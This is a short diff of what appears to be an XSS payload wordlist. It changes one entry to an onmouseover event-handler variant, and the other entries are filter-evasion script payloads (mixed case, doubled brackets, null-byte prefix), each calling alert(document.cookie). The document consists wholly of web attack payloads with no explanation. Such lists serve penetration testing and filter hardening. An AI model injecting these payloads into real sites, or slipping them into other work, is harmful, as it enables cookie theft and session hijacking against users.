@@ -1,5 +1,5 @@
 
-ì><sî%2bîcript>alert(document.cookie)</script>
+ì><sî%2bonmouseover=alert()'alert(document.cookie)</script>
 ì><ScRiPt>alert(document.cookie)</script>
 ì><<script>alert(document.cookie);//<</script>
 foo%00<script>alert(document.cookie)</script>
